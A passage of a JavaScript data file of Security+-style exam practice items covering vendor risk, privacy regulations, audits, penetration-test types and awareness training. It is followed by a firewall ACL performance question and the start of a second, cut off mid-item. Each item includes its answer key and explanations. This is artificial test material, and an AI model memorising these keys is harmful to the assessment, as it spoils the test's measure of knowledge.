  { id:"D5-060", domain:5, obj:"5.3", diff:"hard", q:"A manufacturer discovers that malicious firmware was implanted in components by a third-party producer before delivery. Which risk category does this MOST directly illustrate?", options:["Insider threat","Phishing campaign","Misconfiguration","Supply chain attack"], answer:3, explain:"Malicious firmware implanted in components by a third-party producer before delivery is a classic <strong>supply chain attack</strong>.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Insider threat</b>: an insider threat comes from someone within the organization, not an upstream component producer.</span><span class='qd'><b>Phishing campaign</b>: phishing tricks users into revealing information or clicking links, not tampering with hardware components.</span><span class='qd'><b>Misconfiguration</b>: a misconfiguration is an accidental setup error, not deliberately implanted malicious firmware.</span>" },
  { id:"D5-061", domain:5, obj:"5.3", diff:"medium", q:"To reduce supply chain risk, an organization wants ongoing visibility into a critical vendor's security after the contract begins. Which practice BEST achieves this?", options:["Continuous vendor monitoring","One-time onboarding questionnaire","Signing an NDA","Issuing a single SOW"], answer:0, explain:"<strong>Continuous vendor monitoring</strong> provides ongoing visibility into a critical supplier's security posture throughout the relationship, not just at onboarding.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>One-time onboarding questionnaire</b>: a single questionnaire is a point-in-time snapshot and gives no ongoing visibility.</span><span class='qd'><b>Signing an NDA</b>: an NDA protects confidentiality but does nothing to monitor the vendor's security over time.</span><span class='qd'><b>Issuing a single SOW</b>: a SOW defines project deliverables, not continuous security oversight.</span>" },
  { id:"D5-062", domain:5, obj:"5.3", diff:"hard", q:"An organization is evaluating a SaaS vendor that subcontracts data processing to other providers. What is the MOST important concern to address in the assessment?", options:["The color of the dashboard UI","Fourth-party (subcontractor) risk","The vendor's office location","The vendor's logo branding"], answer:1, explain:"When a SaaS vendor subcontracts processing to other providers, <strong>fourth-party (subcontractor) risk</strong> extends the supply chain and must be assessed and addressed contractually.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>The vendor's office location</b>: office location is not a meaningful security concern compared with subcontractor data handling.</span><span class='qd'><b>The vendor's logo branding</b>: branding has no bearing on the security of subcontracted data processing.</span><span class='qd'><b>The color of the dashboard UI</b>: UI appearance is cosmetic and irrelevant to supply chain risk.</span>" },
  { id:"D5-063", domain:5, obj:"5.3", diff:"easy", q:"Which assessment method involves asking a vendor to self-report on their security controls through a structured form?", options:["Red team exercise","War driving","Questionnaire","Penetration test"], answer:2, explain:"A <strong>questionnaire</strong> asks a vendor to self-report on their security controls through a structured form.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Penetration test</b>: a penetration test actively probes for vulnerabilities rather than collecting self-reported answers.</span><span class='qd'><b>Red team exercise</b>: a red team simulates a real adversary against defenses, not a structured self-assessment form.</span><span class='qd'><b>War driving</b>: war driving searches for wireless networks from a moving vehicle, unrelated to vendor self-reporting.</span>" },
  { id:"D5-064", domain:5, obj:"5.3", diff:"medium", q:"An organization wants independent assurance about a cloud provider's controls without performing its own audit. Which deliverable BEST satisfies this need?", options:["A marketing brochure","An NDA","An MOU","A third-party attestation report (e.g., SOC 2)"], answer:3, explain:"A <strong>third-party attestation report (e.g., SOC 2)</strong> gives independent assurance about a provider's controls without the customer performing its own audit.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>A marketing brochure</b>: a brochure is promotional material with no independent verification of controls.</span><span class='qd'><b>An NDA</b>: an NDA protects confidentiality and offers no assurance about control effectiveness.</span><span class='qd'><b>An MOU</b>: an MOU states mutual intent and provides no audited evidence of security controls.</span>" },
  { id:"D5-065", domain:5, obj:"5.4", diff:"easy", q:"Which regulation governs the protection of personal data for individuals in the European Union?", options:["GDPR","SOX","GLBA","HIPAA"], answer:0, explain:"<strong>GDPR</strong>, the General Data Protection Regulation, governs the protection of personal data for individuals in the European Union.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>HIPAA</b>: HIPAA protects U.S. healthcare information, not EU personal data broadly.</span><span class='qd'><b>SOX</b>: SOX governs financial reporting integrity for U.S. public companies, not EU privacy.</span><span class='qd'><b>GLBA</b>: GLBA protects U.S. financial customers' data, not EU residents' personal data.</span>" },
  { id:"D5-066", domain:5, obj:"5.4", diff:"easy", q:"Which U.S. law specifically protects the privacy and security of healthcare information?", options:["SOX","HIPAA","GDPR","PCI DSS"], answer:1, explain:"<strong>HIPAA</strong>, the Health Insurance Portability and Accountability Act, protects the privacy and security of U.S. healthcare information.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>PCI DSS</b>: PCI DSS governs cardholder payment data, not healthcare records.</span><span class='qd'><b>SOX</b>: SOX addresses financial reporting controls for public companies, not health data.</span><span class='qd'><b>GDPR</b>: GDPR protects EU personal data generally, not specifically U.S. healthcare information.</span>" },
  { id:"D5-067", domain:5, obj:"5.4", diff:"easy", q:"Which standard governs the secure handling of credit and debit card data?", options:["HIPAA","SOX","PCI DSS","GLBA"], answer:2, explain:"<strong>PCI DSS</strong>, the Payment Card Industry Data Security Standard, governs the secure handling of credit and debit card data.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>GLBA</b>: GLBA protects financial institutions' customer data, not specifically cardholder data per card-brand rules.</span><span class='qd'><b>HIPAA</b>: HIPAA covers healthcare information, not payment card data.</span><span class='qd'><b>SOX</b>: SOX governs financial reporting integrity, not the handling of card data.</span>" },
  { id:"D5-068", domain:5, obj:"5.4", diff:"medium", q:"Which U.S. law focuses on financial reporting integrity and internal controls for publicly traded companies?", options:["HIPAA","GDPR","GLBA","SOX"], answer:3, explain:"<strong>SOX</strong>, the Sarbanes-Oxley Act, focuses on financial reporting integrity and internal controls for publicly traded companies.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>GLBA</b>: GLBA addresses safeguarding customer financial data at financial institutions, not public-company reporting controls.</span><span class='qd'><b>HIPAA</b>: HIPAA protects healthcare data, unrelated to financial reporting.</span><span class='qd'><b>GDPR</b>: GDPR governs EU data privacy, not financial reporting accuracy.</span>" },
  { id:"D5-069", domain:5, obj:"5.4", diff:"medium", q:"Which U.S. law requires financial institutions to explain their information-sharing practices and safeguard customer financial data?", options:["GLBA","SOX","PCI DSS","HIPAA"], answer:0, explain:"<strong>GLBA</strong>, the Gramm-Leach-Bliley Act, requires financial institutions to safeguard customer financial data and disclose their information-sharing practices.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>SOX</b>: SOX targets financial reporting integrity for public companies, not customer data safeguarding and sharing disclosures.</span><span class='qd'><b>PCI DSS</b>: PCI DSS covers cardholder data security, not financial institutions' broad information-sharing practices.</span><span class='qd'><b>HIPAA</b>: HIPAA protects healthcare information, not financial institutions' customer data.</span>" },
  { id:"D5-070", domain:5, obj:"5.4", diff:"medium", q:"Under GDPR, what is the term for an individual's ability to request that their personal data be deleted?", options:["Right of indemnity","Right to be forgotten","Right of refusal","Right to audit"], answer:1, explain:"Under GDPR, the <strong>right to be forgotten</strong> (right to erasure) lets a data subject request that their personal data be deleted.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Right of refusal</b>: a right of refusal is a contractual option to accept or decline a transaction, not a GDPR data-deletion right.</span><span class='qd'><b>Right to audit</b>: a right to audit is a contractual clause to inspect a vendor, not an individual's privacy right.</span><span class='qd'><b>Right of indemnity</b>: indemnity concerns compensation for losses, not erasure of personal data.</span>" },
  { id:"D5-071", domain:5, obj:"5.4", diff:"medium", q:"Under GDPR terminology, the individual whose personal data is being processed is referred to as what?", options:["Data controller","Data custodian","Data subject","Data processor"], answer:2, explain:"Under GDPR, the <strong>data subject</strong> is the natural person whose personal data is being processed.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Data processor</b>: a processor handles data on the controller's instructions and is not the person the data is about.</span><span class='qd'><b>Data controller</b>: a controller determines processing purposes and means, not the individual whose data it is.</span><span class='qd'><b>Data custodian</b>: a custodian provides technical protection of data, not the person the data describes.</span>" },
  { id:"D5-072", domain:5, obj:"5.4", diff:"medium", q:"An organization keeps records only as long as legally required and then securely destroys them. Which policy governs this practice?", options:["Acceptable use policy","Change management policy","Patch management policy","Data retention policy"], answer:3, explain:"A <strong>data retention policy</strong> defines how long records are kept and when they must be securely destroyed, balancing legal and business needs.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Acceptable use policy</b>: an AUP governs how employees may use systems, not record retention and disposal.</span><span class='qd'><b>Change management policy</b>: a change management policy governs review and approval of system changes, not data lifecycle timelines.</span><span class='qd'><b>Patch management policy</b>: a patch management policy governs applying updates, not how long records are retained.</span>" },
  { id:"D5-073", domain:5, obj:"5.4", diff:"medium", q:"After failing to meet a regulatory requirement, a company faces a monetary penalty imposed by a government authority. This consequence is BEST described as what?", options:["Fines","Reputational damage","Loss of license only","Contractual indemnity"], answer:0, explain:"<strong>Fines</strong> are monetary penalties imposed by a government authority for non-compliance with legal or regulatory requirements.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Reputational damage</b>: reputational damage is loss of trust and brand harm, an indirect consequence, not a government-imposed monetary penalty.</span><span class='qd'><b>Loss of license only</b>: losing a license is a separate regulatory consequence, and the scenario specifically describes a monetary penalty.</span><span class='qd'><b>Contractual indemnity</b>: indemnity is a contractual compensation obligation between parties, not a regulator-imposed fine.</span>" },
  { id:"D5-074", domain:5, obj:"5.4", diff:"medium", q:"Following a publicized compliance failure, customers lose trust and the brand suffers. Which consequence does this represent?", options:["Right to be forgotten","Reputational damage","Sanctions","Fines"], answer:1, explain:"Loss of customer trust and brand harm after a publicized compliance failure is <strong>reputational damage</strong>.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Sanctions</b>: sanctions are restrictive measures such as operating bans imposed by authorities, not a loss of public trust.</span><span class='qd'><b>Fines</b>: fines are direct monetary penalties, distinct from the indirect harm to brand and trust.</span><span class='qd'><b>Right to be forgotten</b>: the right to be forgotten is a GDPR erasure right, not a consequence of a compliance failure.</span>" },
  { id:"D5-075", domain:5, obj:"5.4", diff:"hard", q:"A government bars an organization from doing business in a particular jurisdiction after repeated compliance violations. Which consequence does this MOST directly describe?", options:["Attestation","Reconnaissance","Sanctions","Fines"], answer:2, explain:"A government barring an organization from doing business in a jurisdiction after repeated violations describes <strong>sanctions</strong>.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Fines</b>: fines are monetary penalties, not bans on operating or trading.</span><span class='qd'><b>Attestation</b>: attestation is an auditor's confirmation of conformance, not a punitive restriction.</span><span class='qd'><b>Reconnaissance</b>: reconnaissance is an attacker's information-gathering activity, unrelated to a compliance consequence.</span>" },
  { id:"D5-076", domain:5, obj:"5.4", diff:"medium", q:"Which activity involves regularly verifying that controls remain effective and that the organization continues to meet regulatory obligations?", options:["Penetration testing","Phishing simulation","Data minimization","Compliance monitoring"], answer:3, explain:"<strong>Compliance monitoring</strong> is the ongoing process of verifying that controls remain effective and that regulatory obligations continue to be met.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Penetration testing</b>: penetration testing actively probes for vulnerabilities, not continuous verification of regulatory adherence.</span><span class='qd'><b>Phishing simulation</b>: a phishing simulation tests employee susceptibility, not the effectiveness of controls against regulations.</span><span class='qd'><b>Data minimization</b>: data minimization is a privacy principle of collecting only necessary data, not an oversight activity.</span>" },
  { id:"D5-077", domain:5, obj:"5.4", diff:"hard", q:"A multinational firm must satisfy GDPR, HIPAA, and PCI DSS simultaneously. What is the BEST approach to managing these overlapping obligations efficiently?", options:["Map controls to a unified compliance framework","Ignore the least strict regulation","Apply only the newest regulation","Address each only after an audit fails"], answer:0, explain:"Mapping shared controls to a <strong>unified compliance framework</strong> lets one set of controls satisfy GDPR, HIPAA, and PCI DSS at once, reducing duplicated effort.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Ignore the least strict regulation</b>: every applicable regulation is mandatory, so ignoring any risks legal penalties.</span><span class='qd'><b>Apply only the newest regulation</b>: newer regulations do not supersede other binding ones, all of which must be met.</span><span class='qd'><b>Address each only after an audit fails</b>: waiting for audit failures is reactive and exposes the firm to violations in the meantime.</span>" },
  { id:"D5-078", domain:5, obj:"5.4", diff:"hard", q:"An auditor asks who is accountable for determining the purposes and means of processing personal data under GDPR. Which role is the correct answer?", options:["Penetration tester","Data controller","Data processor","Data subject"], answer:1, explain:"Under GDPR, the <strong>data controller</strong> determines the purposes and means of processing personal data and bears primary accountability.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Data processor</b>: a processor acts only on the controller's instructions and does not determine processing purposes.</span><span class='qd'><b>Data subject</b>: a data subject is the person the data is about, with no role in deciding how it is processed.</span><span class='qd'><b>Penetration tester</b>: a penetration tester probes systems for weaknesses and is not a GDPR data-governance role.</span>" },
  { id:"D5-079", domain:5, obj:"5.4", diff:"easy", q:"Producing documentation that demonstrates compliance status to regulators or executives is known as what?", options:["Tailgating","Pivoting","Compliance reporting","Reconnaissance"], answer:2, explain:"<strong>Compliance reporting</strong> is the production of documentation that demonstrates compliance status to regulators or executives.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Reconnaissance</b>: reconnaissance is an attacker's information-gathering phase, not the communication of compliance status.</span><span class='qd'><b>Tailgating</b>: tailgating is a physical intrusion technique of following someone through a door, unrelated to reporting.</span><span class='qd'><b>Pivoting</b>: pivoting is moving laterally through a network during an attack, not documenting compliance.</span>" },
  { id:"D5-080", domain:5, obj:"5.5", diff:"easy", q:"Which type of audit is performed by an organization's own staff to evaluate internal controls?", options:["External audit","Regulatory examination","Penetration test","Internal audit"], answer:3, explain:"An <strong>internal audit</strong> is performed by an organization's own staff to evaluate its internal controls from within.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>External audit</b>: an external audit is conducted by an independent third party, not internal staff.</span><span class='qd'><b>Regulatory examination</b>: a regulatory examination is performed by a government authority, not the organization's own personnel.</span><span class='qd'><b>Penetration test</b>: a penetration test actively probes systems for vulnerabilities rather than evaluating control documentation internally.</span>" },
  { id:"D5-081", domain:5, obj:"5.5", diff:"easy", q:"Which type of assessment is conducted by an independent third party to provide unbiased assurance?", options:["External audit","Internal audit","Self-assessment","Tabletop exercise"], answer:0, explain:"An <strong>external audit</strong> is conducted by an independent third party, providing unbiased assurance and greater objectivity.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Internal audit</b>: an internal audit is performed by the organization's own staff and lacks third-party independence.</span><span class='qd'><b>Self-assessment</b>: a self-assessment is performed by the organization on itself, which is inherently not independent.</span><span class='qd'><b>Tabletop exercise</b>: a tabletop exercise is a discussion-based scenario walkthrough, not an independent assurance audit.</span>" },
  { id:"D5-082", domain:5, obj:"5.5", diff:"medium", q:"A formal statement by an auditor confirming that an organization meets a specific standard is called what?", options:["Indemnification","Attestation","Reconnaissance","Sanction"], answer:1, explain:"<strong>Attestation</strong> is an auditor's formal statement confirming that an organization conforms to a specific standard.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Reconnaissance</b>: reconnaissance is an attacker's information-gathering activity, not a formal conformance statement.</span><span class='qd'><b>Sanction</b>: a sanction is a punitive restriction imposed for non-compliance, the opposite of confirming conformance.</span><span class='qd'><b>Indemnification</b>: indemnification is a contractual obligation to compensate for losses, not an auditor's declaration of conformance.</span>" },
  { id:"D5-083", domain:5, obj:"5.5", diff:"medium", q:"In a penetration test where the tester is given full knowledge of the environment, including source code and architecture, what is this engagement called?", options:["Partially known environment (gray box)","Reconnaissance only","Known environment (white box)","Unknown environment (black box)"], answer:2, explain:"A <strong>known environment (white box)</strong> test gives the tester full knowledge of the environment, including source code and architecture.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Unknown environment (black box)</b>: a black-box test provides no internal information, simulating an outside attacker.</span><span class='qd'><b>Partially known environment (gray box)</b>: a gray-box test supplies only some information, not full knowledge of code and architecture.</span><span class='qd'><b>Reconnaissance only</b>: reconnaissance is a single information-gathering phase, not a full engagement type defined by knowledge level.</span>" },
  { id:"D5-084", domain:5, obj:"5.5", diff:"medium", q:"A penetration tester is given no prior information and must discover everything as an outside attacker would. Which environment type is this?", options:["Known environment (white box)","Partially known environment (gray box)","Attestation","Unknown environment (black box)"], answer:3, explain:"An <strong>unknown environment (black box)</strong> test gives the tester no prior information, forcing discovery as an outside attacker would.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Known environment (white box)</b>: a white-box test provides full internal knowledge, the opposite of starting with nothing.</span><span class='qd'><b>Partially known environment (gray box)</b>: a gray-box test supplies limited information, more than the zero knowledge described.</span><span class='qd'><b>Attestation</b>: attestation is an auditor's conformance statement, not a penetration testing knowledge level.</span>" },
  { id:"D5-085", domain:5, obj:"5.5", diff:"medium", q:"A tester receives limited information, such as user-level credentials but not full architecture details. Which penetration testing environment does this describe?", options:["Partially known environment (gray box)","Known environment (white box)","Unknown environment (black box)","Internal audit"], answer:0, explain:"A <strong>partially known environment (gray box)</strong> test provides limited information, such as user-level credentials but not full architecture details.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Known environment (white box)</b>: a white-box test gives complete information, not the partial details described.</span><span class='qd'><b>Unknown environment (black box)</b>: a black-box test provides no information at all, whereas the tester here has some credentials.</span><span class='qd'><b>Internal audit</b>: an internal audit evaluates controls by staff, not a penetration testing knowledge level.</span>" },
  { id:"D5-086", domain:5, obj:"5.5", diff:"easy", q:"During the early phase of a penetration test, the tester gathers publicly available information about the target. What is this phase called?", options:["Remediation","Reconnaissance","Exploitation","Reporting"], answer:1, explain:"<strong>Reconnaissance</strong> is the early information-gathering phase where the tester collects data about the target before active testing.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Exploitation</b>: exploitation is the later phase of actively leveraging a vulnerability, not initial information gathering.</span><span class='qd'><b>Reporting</b>: reporting is the final phase documenting findings, not the early data-collection stage.</span><span class='qd'><b>Remediation</b>: remediation is fixing identified issues after testing, not the gathering phase.</span>" },
  { id:"D5-087", domain:5, obj:"5.5", diff:"medium", q:"A tester reads the target's public website, social media, and DNS records without sending packets to the target's systems. Which reconnaissance type is this?", options:["Exploitation","Privilege escalation","Passive reconnaissance","Active reconnaissance"], answer:2, explain:"<strong>Passive reconnaissance</strong> gathers information from public sources like websites, social media, and DNS records without sending packets to the target.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Active reconnaissance</b>: active reconnaissance directly interacts with target systems, such as scanning, which this scenario explicitly avoids.</span><span class='qd'><b>Exploitation</b>: exploitation actively attacks a vulnerability, not passively collecting public data.</span><span class='qd'><b>Privilege escalation</b>: privilege escalation gains higher access after compromise, not an information-gathering technique.</span>" },
  { id:"D5-088", domain:5, obj:"5.5", diff:"medium", q:"A tester runs port scans and sends probes directly to target hosts to enumerate services. Which reconnaissance type is this?", options:["Passive reconnaissance","Attestation","Compliance monitoring","Active reconnaissance"], answer:3, explain:"<strong>Active reconnaissance</strong> directly interacts with the target, such as running port scans and probing hosts to enumerate services.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Passive reconnaissance</b>: passive reconnaissance gathers public data without touching the target, whereas scanning sends probes to it.</span><span class='qd'><b>Attestation</b>: attestation is an auditor's conformance statement, not a reconnaissance technique.</span><span class='qd'><b>Compliance monitoring</b>: compliance monitoring verifies regulatory adherence, unrelated to scanning a target.</span>" },
  { id:"D5-089", domain:5, obj:"5.5", diff:"hard", q:"An organization wants to test how well its defenders detect and respond to a simulated real-world attack over an extended period. Which engagement type is BEST suited?", options:["Red team exercise","Vulnerability scan","Compliance audit","Questionnaire"], answer:0, explain:"A <strong>red team exercise</strong> simulates a realistic adversary over an extended period to test how well defenders detect and respond.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Vulnerability scan</b>: a vulnerability scan is an automated point-in-time check for known weaknesses, not a sustained test of defender response.</span><span class='qd'><b>Compliance audit</b>: a compliance audit checks adherence to requirements, not detection and response to a simulated attack.</span><span class='qd'><b>Questionnaire</b>: a questionnaire collects self-reported information, not a live adversary simulation.</span>" },
  { id:"D5-090", domain:5, obj:"5.5", diff:"hard", q:"After a penetration test, which deliverable is MOST important for driving security improvements?", options:["The tester's resume","A findings report with prioritized remediation","A list of the tester's tools only","A copy of the engagement contract"], answer:1, explain:"A <strong>findings report with prioritized remediation</strong> is the key deliverable that drives security improvements after a penetration test.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>A list of the tester's tools only</b>: a tool list alone provides no actionable remediation guidance.</span><span class='qd'><b>A copy of the engagement contract</b>: the contract scopes the engagement but does not identify or prioritize fixes.</span><span class='qd'><b>The tester's resume</b>: a resume has no bearing on improving the organization's security posture.</span>" },
  { id:"D5-091", domain:5, obj:"5.5", diff:"hard", q:"An organization must choose between an internal and an external audit for a regulatory certification that requires independence. Which is the BEST choice and why?", options:["Internal audit, because staff know the systems","Either one, independence does not matter","External audit, because independence increases credibility","Internal audit, because it is cheaper"], answer:2, explain:"For a regulatory certification requiring independence, the best choice is an <strong>external audit, because independence increases credibility</strong>.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Internal audit, because it is cheaper</b>: lower cost does not satisfy a requirement for independent, objective assurance.</span><span class='qd'><b>Internal audit, because staff know the systems</b>: familiarity actually undermines the independence the certification demands.</span><span class='qd'><b>Either one, independence does not matter</b>: the requirement explicitly demands independence, so the choice does matter.</span>" },
  { id:"D5-092", domain:5, obj:"5.6", diff:"easy", q:"Which program educates employees about threats like phishing and safe security practices?", options:["Penetration testing","Vendor due diligence","Data retention","Security awareness training"], answer:3, explain:"<strong>Security awareness training</strong> educates employees about threats like phishing and teaches safe security practices, reducing human-factor risk.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Penetration testing</b>: penetration testing probes systems for technical vulnerabilities, not educating employees.</span><span class='qd'><b>Vendor due diligence</b>: due diligence assesses a supplier's suitability, not staff awareness of threats.</span><span class='qd'><b>Data retention</b>: data retention governs how long records are kept, unrelated to teaching employees about threats.</span>" },
  { id:"D5-093", domain:5, obj:"5.6", diff:"easy", q:"Sending simulated phishing emails to employees to measure who clicks is an example of what?", options:["A phishing campaign (simulation)","A penetration test of firewalls","A compliance audit","An SLA review"], answer:0, explain:"Sending simulated phishing emails to measure who clicks is a <strong>phishing campaign (simulation)</strong> that tests employee susceptibility and reinforces training.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>A penetration test of firewalls</b>: this targets network defenses, not employee response to deceptive emails.</span><span class='qd'><b>A compliance audit</b>: a compliance audit verifies regulatory adherence, not user click behavior.</span><span class='qd'><b>An SLA review</b>: an SLA review examines vendor performance commitments, unrelated to phishing susceptibility.</span>" },
  { id:"D5-094", domain:5, obj:"5.6", diff:"medium", q:"An employee suddenly downloads large volumes of files outside normal hours from systems they rarely access. This is BEST categorized as what?", options:["Reconnaissance","Anomalous behavior","Expected behavior","Phishing"], answer:1, explain:"Downloading large volumes of files outside normal hours from rarely accessed systems deviates from baseline and is <strong>anomalous behavior</strong> warranting investigation.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Expected behavior</b>: the activity departs sharply from the user's normal pattern, so it is not expected.</span><span class='qd'><b>Phishing</b>: phishing is a deceptive attempt to trick users, not an unusual internal access pattern.</span><span class='qd'><b>Reconnaissance</b>: reconnaissance is external information-gathering by an attacker, not anomalous insider file activity.</span>" },
  { id:"D5-095", domain:5, obj:"5.6", diff:"medium", q:"Which capability lets employees easily notify security when they receive a suspicious email?", options:["A new SLA","A penetration test","A report-phishing button or mechanism","A faster email server"], answer:2, explain:"A <strong>report-phishing button or mechanism</strong> lets employees easily notify security when they receive a suspicious email, enabling prompt escalation.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>A faster email server</b>: server speed does nothing to help users report suspicious messages.</span><span class='qd'><b>A new SLA</b>: an SLA defines vendor performance levels, not an employee reporting capability.</span><span class='qd'><b>A penetration test</b>: a penetration test probes systems for weaknesses, not a mechanism for users to flag emails.</span>" },
  { id:"D5-096", domain:5, obj:"5.6", diff:"medium", q:"To keep awareness training effective over time, what is the BEST practice for delivering it?", options:["A single session at hire only","Training only after a breach","No training to save time","Recurring training with periodic refreshers"], answer:3, explain:"<strong>Recurring training with periodic refreshers</strong> keeps awareness current as threats evolve, which is the best practice for delivery.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>A single session at hire only</b>: one onboarding session quickly grows stale as threats and tactics change.</span><span class='qd'><b>Training only after a breach</b>: reactive post-breach training fails to prevent incidents and leaves long gaps in awareness.</span><span class='qd'><b>No training to save time</b>: skipping training entirely leaves employees unprepared and raises human-factor risk.</span>" },
  { id:"D5-097", domain:5, obj:"5.6", diff:"medium", q:"An organization tracks phishing-simulation click rates over several quarters to gauge improvement. This is an example of what?", options:["Monitoring and reporting on awareness effectiveness","Active reconnaissance","Vendor onboarding","Data minimization"], answer:0, explain:"Tracking phishing-simulation click rates over several quarters is <strong>monitoring and reporting on awareness effectiveness</strong>.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Active reconnaissance</b>: active reconnaissance is an attacker probing a target, not measuring internal training results.</span><span class='qd'><b>Vendor onboarding</b>: vendor onboarding brings a supplier into a relationship, unrelated to awareness metrics.</span><span class='qd'><b>Data minimization</b>: data minimization limits data collection, not tracking of training effectiveness.</span>" },
  { id:"D5-098", domain:5, obj:"5.6", diff:"hard", q:"After repeated phishing simulations, one department still shows high click rates. What is the MOST effective next step?", options:["Replace the entire department","Provide targeted role-based training to that department","Disable all email for that department","Ignore it since most employees passed"], answer:1, explain:"When one department keeps showing high click rates, the most effective step is to <strong>provide targeted role-based training to that department</strong>.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Disable all email for that department</b>: cutting off email cripples business operations and does not address the awareness gap.</span><span class='qd'><b>Ignore it since most employees passed</b>: ignoring a persistent weak spot leaves a real, exploitable exposure unaddressed.</span><span class='qd'><b>Replace the entire department</b>: mass replacement is disproportionate and ignores that training can correct the behavior.</span>" },
  { id:"D5-099", domain:5, obj:"5.6", diff:"hard", q:"A security team wants employees to recognize and report behavior that may indicate an insider threat. Which awareness focus BEST supports this goal?", options:["Learning to write SLAs","Configuring DNS servers","Recognizing and reporting anomalous behavior","Memorizing firewall rules"], answer:2, explain:"Teaching staff to <strong>recognize and report anomalous behavior</strong> empowers them to help detect insider threats early.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Memorizing firewall rules</b>: firewall rule knowledge is a technical administration skill, not a way to spot insider threats.</span><span class='qd'><b>Learning to write SLAs</b>: SLA authoring is a contract skill, unrelated to detecting suspicious internal behavior.</span><span class='qd'><b>Configuring DNS servers</b>: DNS configuration is a network task, not an awareness focus for identifying insider threats.</span>" },
  { id:"D5-100", domain:5, obj:"5.6", diff:"hard", q:"An organization sees that employees who report phishing are sometimes ignored, discouraging future reports. What is the BEST remedy to sustain a reporting culture?", options:["Penalize employees who report","Remove the reporting button","Stop running simulations","Acknowledge reports and give timely feedback"], answer:3, explain:"To sustain a reporting culture, the best remedy is to <strong>acknowledge reports and give timely feedback</strong>, reinforcing positive behavior.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Penalize employees who report</b>: penalizing reporters discourages the very behavior the organization wants to encourage.</span><span class='qd'><b>Remove the reporting button</b>: removing the mechanism eliminates the ability to report suspicious emails entirely.</span><span class='qd'><b>Stop running simulations</b>: halting simulations removes a key tool for measuring and improving awareness.</span>" }
);
SECPLUS.pbqs.push(
  {
    id:"PBQ-001", format:1, domain:3,
    title:"Public Web Server in the DMZ",
    brief:"Your company hosts a public web server in the DMZ. Internet clients must reach it over HTTPS only, and the server must not be allowed to initiate connections back into the internal LAN. Complete the next-generation firewall ACL.",
    exhibitTitle:"fw0://acl",
    exhibit:"        <span class='cy'>[ Internet ]</span>\n             |\n        +---------+\n        |  NGFW   |\n        +----+----+\n     ____|____|________\n    |         |        |\n  <span class='warnc'>DMZ</span>      Internal     DB-VLAN\n web-srv     LAN        10.20.0.0/24\n 203.0.113.10  10.10.0.0/16\n\nACL (top-down, implicit deny at end)\n# ACT   SRC          DST            PORT  PROTO\n1 ____  any          203.0.113.10   ____  ____\n2 DENY  203.0.113.10 10.10.0.0/16   any   any\n3 <span class='dim'>...implicit deny any/any...</span>",
    fields:[
      { label:"Rule 1 ACTION (allow inbound web traffic)", hint:"Clients must reach the site.", options:["Permit","Log only","Reject with reset","Deny"], answer:0, explain:"Inbound HTTPS to the public web server must be explicitly permitted before the implicit deny." },
      { label:"Rule 1 DESTINATION PORT", hint:"HTTPS only.", options:["22","443","3389","80"], answer:1, explain:"HTTPS uses TCP 443; HTTP (80) was not requested and should stay closed." },
      { label:"Rule 1 PROTOCOL", options:["UDP","ICMP","TCP","GRE"], answer:2, explain:"HTTPS rides on TCP, so the rule must specify TCP." },
      { label:"Purpose of Rule 2 (DMZ host to internal LAN = deny)", hint:"Think about a compromised DMZ host.", options:["Blocks DNS resolution","Enables clustering","Improves web performance","Prevents lateral movement from a compromised DMZ host into the LAN"], answer:3, explain:"A DMZ host should never initiate inbound connections to the trusted LAN; denying it limits lateral movement if the server is breached." }
    ],
    summary:"Permit TCP 443 from any to the DMZ web server, then deny the DMZ host from reaching the internal LAN, relying on the implicit deny for everything else."
  },
  {
    id:"PBQ-002", format:1, domain:3,
    title:"Remote Admin via Jump Host",
    brief:"Administrators must manage internal servers only through a hardened jump host (bastion). Direct RDP/SSH from the Internet to internal servers must be blocked. Configure the ACL so only the jump host can reach internal management ports.",
    exhibitTitle:"fw0://acl",
